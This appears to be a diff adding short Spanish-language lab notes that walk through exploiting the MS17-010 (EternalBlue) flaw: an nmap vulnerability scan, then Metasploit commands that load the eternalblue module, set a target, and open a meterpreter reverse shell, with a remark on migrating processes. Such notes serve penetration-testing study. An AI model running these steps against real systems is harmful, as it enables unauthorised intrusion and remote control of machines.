@@ -1,0 +1,30 @@
+1.nmap :
+	nmap --script vuln <ip>
+
+	(ms17-010) vulnerable.
+
+2.Metaesploit :
+	- msfconsole 
+
+	- search ms17_010
+
+	- use windows/smb/ms17_010_eternalblue
+
+	- set RHOSTS <ip>
+
+	- exploit 
+	
+		- nos da shell reverse 
+	
+	
+		- show payloads
+
+		- set PAYLOAD windows/x64/meterpreter/reverse_tcp 
+
+		- exploit
+
+3. Escalada a Privilegios :
+	ya no es necesario porque tenemos una shell meterpreter.		 
+	
+	aunque por si se apaga el servicio que estamos ejecutando hay que migrar de proceso.	
+	
